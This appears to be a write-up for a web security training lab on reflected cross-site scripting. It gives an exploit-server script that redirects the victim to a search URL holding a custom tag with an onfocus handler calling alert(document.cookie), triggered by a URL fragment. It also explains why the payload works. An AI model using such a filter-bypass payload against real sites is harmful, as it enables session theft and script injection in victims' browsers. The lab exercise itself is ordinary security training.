![image](https://github.com/udayk01/Web-Security/assets/52235763/8502aa33-17f0-47aa-b2a2-fb38f5e84626)

## Solution:

![Screenshot 2024-04-17 125923](https://github.com/udayk01/Web-Security/assets/52235763/50ba4cc1-0057-4b93-a6f0-a1f5ff5ddc1d)

> Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:

```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

![image](https://github.com/udayk01/Web-Security/assets/52235763/6af7c6c7-7267-42b7-b7cb-8ba81f7340d5)

> Click "Store" and "Deliver exploit to victim".

![image](https://github.com/udayk01/Web-Security/assets/52235763/6bf607f9-7737-469b-975f-7265a5e56ffd)

> This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.

> Lab Solved

![image](https://github.com/udayk01/Web-Security/assets/52235763/634d8bee-d2f2-44d1-9efe-67d80b23b159)
